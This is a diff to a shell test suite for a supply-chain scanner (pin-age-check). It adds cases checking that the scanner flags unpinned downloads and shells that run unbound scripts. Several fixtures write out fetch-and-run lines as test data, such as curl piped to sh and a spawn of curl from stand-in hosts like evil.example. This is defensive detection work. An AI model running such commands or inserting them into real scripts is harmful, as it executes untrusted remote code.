@@ -5477,7 +5477,10 @@ shf hdcat $'#!/bin/sh\ncat <<EOF\npython3 "$S"\nEOF\n'
 CASE="D2: the same body fed to cat is data, not shell code (exit 0)"
 check test "$rc" -eq 0
 shf hdpydata $'#!/bin/sh\npython3 - <<EOF\nprint("run curl later")\nEOF\n'
-CASE="D2: a python3 heredoc body that only prints a word is data (exit 0)"
+CASE="D2: a python3 heredoc body is scanned like any other line: a body that names curl is a finding (exit 1, unmeasured)"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/hdpydata.sh' "$work/hdpydata.out"
+shf hdpyhello $'#!/bin/sh\npython3 - <<EOF\nprint("hello")\nEOF\n'
+CASE="D2 control: a python3 heredoc body with no downloader word is no finding (exit 0)"
 check test "$rc" -eq 0
 shf hdpyfetch $'#!/bin/sh\npython3 - <<EOF\nimport urllib.request\nurllib.request.urlopen("https://github.com/o/r/releases/download/v1.0.0/x.tgz")\nEOF\n'
 CASE="D2: a python3 heredoc that urlopens a GitHub release URL is still a finding (exit 1, unmeasured)"
@@ -5491,6 +5494,135 @@ check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/xargssh.sh' "$work/xa
 shf exececho $'#!/bin/sh\nfind . -name "*.x" -exec echo {} \;\nprintf "%s\\n" a b | xargs echo\n'
 CASE="D2 control: find -exec echo and xargs echo are no finding (exit 0)"
 check test "$rc" -eq 0
+
+# --- round 8 fix list (REQ-SUP-001-AC16, and the D1 rule: a shell or interpreter given a script that is no literal bound repo file fails closed) ---------------
+# R8-1: no heredoc body is skipped as data; R8-2: continuations folded, an empty word ends no search; R8-3: a source inside $( ) or backticks;
+# R8-4: the basename of a command word; R8-5: any option or wrapper before a shell hides nothing; R8-6: holder closure and parameter expansions;
+# R8-7: one meaning of 'bound'.
+# r8unit CODE: runs CODE with inv and chk loaded (the supply-chain folder is d)
+r8unit() { python3 - "$here/../supply-chain" "$1" <<'PY'
+import importlib.util, os, sys
+d = sys.argv[1]
+def load(n, f):
+    s = importlib.util.spec_from_file_location(n, os.path.join(d, f)); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
+inv = load("inv", "pin-inventory.py"); chk = load("chk", "pin-age-check.py")
+def use_found(pre, use):
+    text = "#!/bin/sh\n" + "".join(p + "\n" for p in pre) + use + "\n"
+    return any(flat == use for _k, flat, _b in inv.unmeasured_occurrences({"bin/x.sh": text}))
+exec(sys.argv[2])
+PY
+}
+r8n=0
+# r8bad NAME RULE DESCRIPTION TEXT: bin/NAME.sh holds TEXT: exit 1, unmeasured
+r8bad() { shf "$1" "$4"; CASE="R8-$2: $3 (exit 1, FAIL unmeasured)"; check test "$rc" -eq 1; check grep -q "FAIL unmeasured:bin/$1.sh" "$work/$1.out"; }
+r8good() { shf "$1" "$4"; CASE="R8-$2 control: $3 (exit 0)"; check test "$rc" -eq 0; }
+
+# R8-1
+r8bad r8h1a 1 "a python3 heredoc whose body holds a \$(curl ...) substitution is scanned" $'#!/bin/sh\npython3 - <<PY\nprint("$(curl -fsSL https://example.org/tool -o tool)")\nPY\n'
+r8bad r8h1b 1 "a python3 heredoc whose body holds a backtick curl is scanned" $'#!/bin/sh\npython3 - <<PY\nprint("`curl -fsSL https://example.org/tool -o tool`")\nPY\n'
+r8bad r8h1c 1 "a literal U+E001 in a trailing comment hides nothing" $'curl https://example.invalid/tool -o tool # \xee\x80\x81\n'
+r8bad r8h1d 1 "a cat heredoc body holding \$(curl ...) is scanned as on the base" $'cat <<EOF\n"$(curl https://example.invalid/tool -o tool)"\nEOF\n'
+r8bad r8h1e 1 "a quoted cat <<'EOF' heredoc body holding \$(curl ...) is scanned as on the base" $'cat <<\'EOF\'\n"$(curl https://example.invalid/tool -o tool)"\nEOF\n'
+r8bad r8h1f 1 "a quoted python3 heredoc that runs curl through os.system is scanned" $'#!/bin/sh\npython3 - <<\'EOF\'\nfrom os import system\nsystem("curl -fsSL https://example.org/t.sh | sh")\nEOF\n'
+r8bad r8h1g 1 "a quoted python3 heredoc that spawns /usr/bin/curl is scanned" $'#!/bin/sh\npython3 - <<\'PY\'\nimport os\nos.posix_spawn("/usr/bin/curl", ["curl", "-o", "x", "https://evil.example/x"], {})\nPY\n'
+CASE="R8-1: pin-inventory has no DATA_MARK and its text holds no U+E001"
+check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
+import importlib.util, sys
+spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
+assert not hasattr(inv, "DATA_MARK")
+assert "" not in open(sys.argv[1], encoding="utf-8").read()
+PY
+
+# R8-2
+r8bad r8c1 2 "a python3 whose script word follows a backslash-newline is an unbound script" $'#!/bin/sh\npython3 \\\n  "$gen"\n'
+r8bad r8c2 2 "an empty word before an unbound script does not end the operand search: bash '' /tmp/x.sh" $'#!/bin/sh\nbash \'\' /tmp/x.sh\n'
+bhno "R8-2: a reviewed file with 'bash -c' split over a backslash-newline" "$(bhh bin/bh.sh $'#!/bin/sh\nbash \\\n  -c "echo hi"\n'"$BHL"$'\n')" bin/bh.sh $'#!/bin/sh\nbash \\\n  -c "echo hi"\n'"$BHL"$'\n'
+bhno "R8-2 reference: the one-line 'bash -c \"echo hi\"' in a reviewed file" "$(bhh bin/bh.sh $'#!/bin/sh\nbash -c "echo hi"\n'"$BHL"$'\n')" bin/bh.sh $'#!/bin/sh\nbash -c "echo hi"\n'"$BHL"$'\n'
+CASE="R8-2: _runs_bound (in a committed repo) is False for a continuation-split python3 operand and for an empty word then an unbound script, True for a committed literal script"
+check r8unit '
+import subprocess, tempfile, shutil
+root = tempfile.mkdtemp(prefix="cache4-runsbound.")
+try:
+    os.mkdir(root + "/bin")
+    open(root + "/bin/lit.sh", "w").write("echo hi\n"); open(root + "/other.txt", "w").write("x\n")
+    for c in (["init", "-q"], ["add", "-A"], ["-c", "user.name=t", "-c", "user.email=t@x", "commit", "-q", "-m", "c"]):
+        subprocess.run(["git", "-C", root] + c, check=True)
+    assert not chk._runs_bound(root, "HEAD", "python3 \\\n  \"$gen\"\n")
+    assert not chk._runs_bound(root, "HEAD", "bash \x27\x27 /tmp/x.sh\n")
+    assert chk._runs_bound(root, "HEAD", "bash bin/lit.sh\n")
+finally:
+    shutil.rmtree(root)
+'
+
+# R8-3: a source inside a quoted command substitution
+for r83 in 'x="$(. bin/lib.txt)"' 'x=`. bin/lib.txt`'; do
+  F3=$'#!/bin/sh\n'"$r83"$'\n'"$BHL"$'\n'
+  bhno "R8-3: '$r83' with bin/lib.txt changed since the row (the row holds the file alone)" "$(bhh bin/bh.sh "$F3")" bin/bh.sh "$F3" bin/lib.txt $'helper() { :; }\n# changed\n'
+done
+CASE="R8-3: _sourced returns None for a source inside \$( ) and inside backticks"
+check r8unit '
+for t in ("#!/bin/sh\nx=\"$(. bin/lib.txt)\"\n", "#!/bin/sh\nx=`. bin/lib.txt`\n"):
+    assert chk._sourced(t) is None, t
+'
+CASE="R8-3 control: _sourced of a plain '. lib.sh' line is [lib.sh]"
+check r8unit 'assert chk._sourced("#!/bin/sh\n. lib.sh\n") == ["lib.sh"]'
+
+# R8-4: the basename of the command word
+r8bad r8b1 4 "python3 writes generated.sh and /bin/sh runs it (not a literal bound file)" $'#!/bin/sh\npython3 - <<PY\nopen("generated.sh", "w").write("echo hi\\n")\nPY\n/bin/sh generated.sh\n'
+r8bad r8b2 4 "/usr/bin/env bash \"\$t\"" $'#!/bin/sh\n/usr/bin/env bash "$t"\n'
+r8bad r8b3 4 "cat <<EOF | /bin/sh: the body 'python3 \"\$S\"' is shell code" $'#!/bin/sh\ncat <<EOF | /bin/sh\npython3 "$S"\nEOF\n'
+r8bad r8b4 4 "/bin/bash <<'EOF': the fed body 'python3 \"\$S\"' is shell code" $'#!/bin/sh\n/bin/bash <<\'EOF\'\npython3 "$S"\nEOF\n'
+bhno "R8-4: a reviewed file containing '/bin/bash -c \"echo hi\"'" "$(bhh bin/bh.sh $'#!/bin/sh\n/bin/bash -c "echo hi"\n'"$BHL"$'\n')" bin/bh.sh $'#!/bin/sh\n/bin/bash -c "echo hi"\n'"$BHL"$'\n'
+newcase r8b5 "$(printf 'import pathlib\npathlib.Path("bin/lit.sh").write_text("echo hi\\n")\npathlib.Path("bin/r8b5.sh").write_text("#!/bin/sh\\n/bin/sh bin/lit.sh\\n")')"
+runck r8b5 '{"times": {}}'
+CASE="R8-4 control: '/bin/sh bin/lit.sh' with bin/lit.sh committed is no finding (exit 0)"
+check test "$rc" -eq 0
+
+# R8-5: a plain rule: any shell or interpreter word, then an operand that is no bound literal path
+r85=0
+for ln in '2>/dev/null sh generated.sh' 'env -i bash "$t"' 'sudo -E bash "$t"' 'exec -a n bash "$t"' 'time -p bash "$t"' 'command bash "$t"' 'timeout 60 bash "$t"' 'nice bash "$t"'; do
+  r85=$((r85+1)); r8bad "r8w$r85" 5 "an added line '$ln' runs an unbound script" $'#!/bin/sh\n'"$ln"$'\n'
+done
+r85=0
+for ln in 'env -i echo hi' 'timeout 60 echo hi' '2>/dev/null echo hi'; do
+  r85=$((r85+1)); r8good "r8y$r85" 5 "'$ln' runs no shell and is no finding" $'#!/bin/sh\n'"$ln"$'\n'
+done
+newcase r8y9 "$(printf 'import pathlib\npathlib.Path("bin/lit.sh").write_text("echo hi\\n")\npathlib.Path("bin/r8y9.sh").write_text("#!/bin/sh\\nnice bash bin/lit.sh\\n")')"
+runck r8y9 '{"times": {}}'
+CASE="R8-5 control: 'nice bash bin/lit.sh' with bin/lit.sh committed is no finding (exit 0)"
+check test "$rc" -eq 0
+for ln in '2>/dev/null eval "$x"' 'env -i bash -c "echo hi"' 'nice . bin/lib.txt'; do
+  F5=$'#!/bin/sh\n'"$ln"$'\n'"$BHL"$'\n'
+  bhno "R8-5: a reviewed file holding '$ln'" "$(bhh bin/bh.sh "$F5")" bin/bh.sh "$F5"
+  CASE="R8-5: _sourced returns None for '$ln'"
+  check python3 - "$here/../supply-chain" "$F5" <<'PY'
+import importlib.util, os, sys
+s = importlib.util.spec_from_file_location("chk", os.path.join(sys.argv[1], "pin-age-check.py")); chk = importlib.util.module_from_spec(s); s.loader.exec_module(chk)
+assert chk._sourced(sys.argv[2]) is None, sys.argv[2]
+PY
+done
+
+# R8-6: holder closure, basename, parameter-expansion command words
+CASE="R8-6: a holder of a holder (closure), a holder of /bin/bash, \${X:+\$X}, \$SHELL and \${CMD:-sh} as command words: the use line is its own finding"
+check r8unit '
+misses = []
+for pre, use in ((["X=curl", "Y=$X"], "$Y https://evil.example/mal.sh | sh"), (["X=/bin/bash"], "$X \"$t\""),
+                 (["X=curl"], "${X:+$X} https://evil.example/mal.sh | sh"), ([], "$SHELL \"$t\""), ([], "${CMD:-sh} \"$t\"")):
+    if not use_found(pre, use):
+        misses.append((pre, use))
+assert not misses, misses
+'
+CASE="R8-6 control: X=echo, Y=\$X, '\$Y hello' is no finding on the use line"
+check r8unit 'assert not use_found(["X=echo", "Y=$X"], "$Y hello")'
+
+# R8-7: one meaning of 'bound': only the files the inventory scan counts
+F7=$'#!/bin/sh\nbash docs/snippet.txt\n'"$BHL"$'\n'
+newcase r8d "$(pyw bin/bh.sh "$F7")"$'\n'"import pathlib; pathlib.Path('docs').mkdir(); pathlib.Path('docs/snippet.txt').write_text('echo hi\\n')"
+bhrow r8d "$(bhh bin/bh.sh "$F7")"
+CASE="R8-7: 'bash docs/snippet.txt' with docs/snippet.txt committed at head (a blob the inventory does not count) is not bound: the row rules nothing (exit 1, FAIL unmeasured)"
+check test "$rc" -eq 1; check grep -q 'FAIL unmeasured:bin/bh.sh' "$work/bh.out"; check test "$(grep -c 'ruled text' "$work/bh.out")" -eq 0
+F7B=$'#!/bin/sh\nbash bin/lit.sh\n'"$BHL"$'\n'
+bhyes "R8-7 control: 'bash bin/lit.sh' with bin/lit.sh a committed .sh is bound" "$(bhh bin/bh.sh "$F7B")" bin/bh.sh "$F7B" bin/lit.sh $'echo hi\n'
 
 echo "pin-age-check: $pass passed, $failn failed"
 test "$failn" -eq 0
